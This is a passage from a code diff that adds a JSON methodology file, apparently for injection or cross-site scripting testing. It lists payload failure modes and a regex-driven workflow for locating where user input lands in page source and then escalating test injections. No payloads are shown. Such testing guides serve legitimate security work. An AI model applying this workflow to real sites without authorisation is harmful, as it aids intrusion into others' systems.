+      "Syntax/Structure failure - injection doesn't escape context",
+      "Payload failure - malicious code doesn't execute",
+      "Execution context failure - payload executes in wrong context",
+      "Cleanup failure - syntax errors break page functionality"
+    ],
+    "regex_usage": {
+      "purpose": "Automatically detect injection contexts in source code or responses",
+      "implementation": "Use detection_regex patterns to identify where USER_INPUT appears",
+      "workflow": [
+        "Scan response/source code with detection regex",
+        "Identify matching context type",
+        "Apply appropriate progressive testing methodology",
+        "Use structural requirements for that context",
+        "Execute progressive testing steps in order"
+      ]
+    }
+  }
+}
